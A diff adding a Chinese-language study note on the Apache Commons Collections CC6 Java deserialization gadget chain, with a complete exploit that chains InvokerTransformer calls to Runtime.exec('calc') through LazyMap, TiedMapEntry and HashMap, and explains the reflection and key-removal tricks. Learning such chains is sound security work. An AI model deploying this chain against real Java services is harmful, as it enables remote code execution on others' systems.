@@ -460,3 +460,115 @@ public class CC3 {
 ```
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758875725896-0b8c6a47-3110-4949-afe0-f0989adec2ab.png)执行成功
+
+# CC6
+
+![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758731581461-e1bedb18-2462-43d8-93f7-1122804ddee9.png)
+
+## 完整exp：
+
+```
+package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC6Test {
+    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null, null}),
+                new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap<Object,Object> map = new HashMap();
+        Map<Object,Object> lazymap = LazyMap.decorate(map,new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "aaa");
+
+        HashMap<Object, Object> map2 = new HashMap<>();
+        map2.put(tiedMapEntry, "value");
+        lazymap.remove("aaa");
+
+        Field factoryField = LazyMap.class.getDeclaredField("factory");
+        factoryField.setAccessible(true);
+        factoryField.set(lazymap, chainedTransformer);
+
+//        serialize(map2);
+
+        unserialize("person.txt");
+    }
+
+
+    public static void serialize(Object obj) throws IOException, NoSuchFieldException, IllegalAccessException {
+        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("person.txt"));
+        oos.writeObject(obj);
+        System.out.println("序列化完成");
+    }
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
+    {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        System.out.println("反序列化"+Filename +"完成");
+        return obj;
+    }
+}
+```
+
+整个流程后半部分和lazyMap链差不多，都是实现lazyMap类的get方法，来实现其中factory参数的transform方法（factory参数可控），然后factory是chainedtransformer，循环调用InvockerTransformer实现rce
+
+### 前半部分
+
+至于如何实现LazyMap的get方法，就和之前略有不同，因为jdk后来改了一些jdk自带的库，所以导致cc1用不了，这才有了万能的cc6。
+
+### cc6中实现get
+
+查找get的实现类，但是太多了我们就不找了，原作者找到了一个类`TiedMapEntry`类中的hashCode方法实现了get方法
+
+![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758680371786-4b219798-35d7-40d5-9554-bcd0918824b6.png)![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758680388788-3e02423a-7328-43d0-a002-b5c9de3139b8.png)
+
+准确的说是hashCode实现了getValue，而getValue实现了map.get方法，而map参数是我们能控制的
+
+![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758680900075-54c1000e-8de9-43c1-a70a-30acf37393c0.png)
+
+所以给map传一个LazyMap的对象即可
+
+接下来就是如何调用hashCode方法，之前的URLDNS链中学到过，可以用hashMap中的readObject，里面会调用到hashMap。
+
+## 问题一
+
+此时这里会遇到和URLDNS中相同的问题，put会提前触发链子，因为put中也调用了hashCode方法
+
+这里我们的解决办法是在之前前不完善链子，一开始不给LazyMap传入chainedTransformer，而是随便传一个，此时不会触发后面的链子，等put方法完成后我们在利用反射给LazyMap中的参数赋值为chaindeTransformer，触发后续链子。
+
+### 实现：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758681314816-bb19b36e-0dc2-4bd0-86f5-2020e772b4f6.png)
+
+这里原本第一个LazyMap.decorate里面是赋值为chainedTransformer，这里改为别的，后续在反射赋值。
+
+## 问题二
+
+看上图，开始我们没有执行remove方法，这里是因为在实现LazyMap的get方法时有一个if判断
+
+![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758681664439-60b63f16-04d3-462a-b260-e9b411d1bb63.png)
+
+是说在get时会判断key值是否为空，如果不为空就不会执行transformer，而我们要的是执行transformer，所以要让这个key为空。但是我们序列化之前就调用了put方法，虽然经过上一步操作没有让put提前执行完整的链子，但是他还是执行到了get方法里面，只是执行transform方法时不是执行的`chainedTransformer.transform`，所以执行get方法时就把key给put进去了，这个key就是我们上面给TiedMapEntry赋值的key`"aaa"`
+
+### 解决：
+
+因为是put之后导致的添加key，所以在put之后再把key移除就好了
+
+![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758684118025-0bae5955-e7cf-4bc2-9c10-e39b7c0cc365.png)这样就解决问题了
+
+![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758684148678-1c2ee787-4f9b-4e16-92e6-9793acb2a680.png)
